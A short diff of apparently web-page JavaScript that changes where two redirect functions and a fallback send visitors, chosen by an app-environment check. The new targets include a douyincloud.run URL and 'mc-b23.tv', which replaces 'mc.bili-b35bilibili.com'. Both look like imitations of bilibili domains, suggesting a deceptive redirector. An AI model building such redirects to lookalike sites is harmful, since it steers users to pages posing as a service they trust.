@@ -46,11 +46,11 @@
     }
 
     function first() {
-        location.href = "https://1kf5it1ciohf7-env-dDhjWZGo1K.service.douyincloud.run/tzb.html";
+        location.href = "https://1kkbp6w6sx2qr-env-ddhjwzgo1k.service.douyincloud.run/tzb.html";
     }
 
     function second() {
-        location.href = "https://mc.bili-b35bilibili.com/mc.html";
+        location.href = "https://mc-b23.tv/mc.html";
     }
 
     function isDouyinLiteApp() {
@@ -83,7 +83,7 @@
             second();
         } else {
            
-            window.location.href = 'https://mc.bili-b35bilibili.com/mc.html';
+            window.location.href = 'https://mc-b23.tv/mc.html';
         }
     }
 
